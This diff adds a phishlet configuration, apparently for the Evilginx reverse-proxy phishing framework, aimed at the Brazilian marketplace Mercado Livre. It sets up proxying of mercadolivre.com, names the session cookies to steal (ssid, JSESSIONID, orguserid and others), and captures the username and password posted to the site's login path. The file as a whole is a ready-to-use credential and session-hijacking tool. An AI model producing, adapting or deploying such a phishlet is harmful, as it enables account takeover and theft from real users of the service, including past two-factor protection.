@@ -1,0 +1,24 @@
+author: '@bytebounty'
+min_ver: '2.3.0'
+proxy_hosts:
+  - { phish_sub: '', orig_sub: '', domain: 'mercadolivre.com', session: true, is_landing: true }
+
+sub_filters: []
+
+auth_tokens:
+  - domain: '.mercadolivre.com'
+    keys: ['cp', 'ftid', 'orghash', 'orgnickp', 'orguserid', 'orduseridp', 'ssid', 'JSESSIONID']
+
+credentials:
+  username:
+    key: 'user_id'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'mercadolivre.com'
+  path: '/jms/mlb/lgz/msl/login'
